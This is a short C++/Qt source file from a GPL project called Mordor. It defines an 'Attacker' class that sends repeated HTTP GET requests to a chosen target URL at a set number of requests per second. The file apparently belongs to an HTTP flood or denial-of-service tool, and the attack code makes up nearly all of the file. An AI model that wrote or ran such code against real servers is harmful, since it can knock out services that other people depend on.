/**
 *  This file is part of Mordor.
 *
 *  Copyright (c) 2016 Juan Jose Salazar Garcia jjslzgc@gmail.com
 *
 *  Mordor is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  Mordor is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with Mordor.  If not, see <http://www.gnu.org/licenses/>.
 *
 **/

#include "attacker.h"
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QTimer>

Attacker::Attacker(ushort requestPerSecond) : _requetsPerSecond(requestPerSecond)
{
    _networkAccessManager = new QNetworkAccessManager(this);
}

void Attacker::setTarget(const QString &target)
{
    _target = target;
}

void Attacker::attack()
{
    QTimer::singleShot(static_cast<int>(1000.0 / _requetsPerSecond), this, SLOT(sendHttpGetRequestToTarget()));
}

void Attacker::sendHttpGetRequestToTarget()
{
    QNetworkReply *reply = _networkAccessManager -> get(QNetworkRequest(QUrl(_target)));

    reply -> deleteLater();

    emit done();
}
